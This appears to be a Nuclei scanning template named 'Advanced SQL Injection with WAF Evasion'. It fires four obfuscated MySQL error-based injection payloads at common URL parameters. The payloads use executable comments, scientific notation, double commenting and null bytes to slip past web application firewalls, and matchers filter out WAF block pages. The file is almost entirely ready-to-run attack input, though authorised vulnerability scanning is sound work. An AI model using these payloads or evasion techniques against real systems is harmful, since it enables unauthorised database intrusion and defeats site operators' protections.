id: waf-bypass-sqli-precision

info:
  name: Advanced SQL Injection with WAF Evasion
  author: nawab-hacker
  severity: critical
  description: Targeted at bypassing firewalls using comment-level obfuscation and hex encoding.
  tags: sqli, advanced, waf-bypass, precision

http:
  - method: GET
    path:
      - "{{BaseURL}}/?id={{payload}}"
      - "{{BaseURL}}/?search={{payload}}"
      - "{{BaseURL}}/?query={{payload}}"
      - "{{BaseURL}}/?page={{payload}}"

    payloads:
      payload:
        # MySQL Executable Comment Bypass
        - "1'/*!AND*/(updatexml(1,concat(0x7e,(select+0x53514c695f53756363657373),0x7e),1))--+-"
        # Scientific Notation + Comment Bypass
        - "1e0'/*!AND*/extractvalue(1,concat(0x7e,0x53514c695f53756363657373))--+-"
        # Double Commenting for Regex Confusion
        - "1'/**/AND/**/(SELECT/**/1/**/FROM/**/(SELECT/**/COUNT(*),CONCAT(0x7e,0x53514c695f53756363657373,0x7e,FLOOR(RAND(0)*2))x/**/FROM/**/INFORMATION_SCHEMA.PLUGINS/**/GROUP/**/BY/**/x)a)--+-"
        # Null Byte + Comment Bypass
        - "1'%00/*!AND*/(updatexml(1,concat(0x7e,0x53514c695f53756363657373),1))--+-"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      # Verified database output
      - type: word
        part: body
        words:
          - "SQLi_Success"

      # Successful status code
      - type: status
        status:
          - 200

      # Negative matching to filter out WAF block pages
      - type: word
        part: body
        negative: true
        words:
          - "Forbidden"
          - "Access Denied"
          - "Your client does not have permission"
          - "WAF"
          - "Cloudflare"
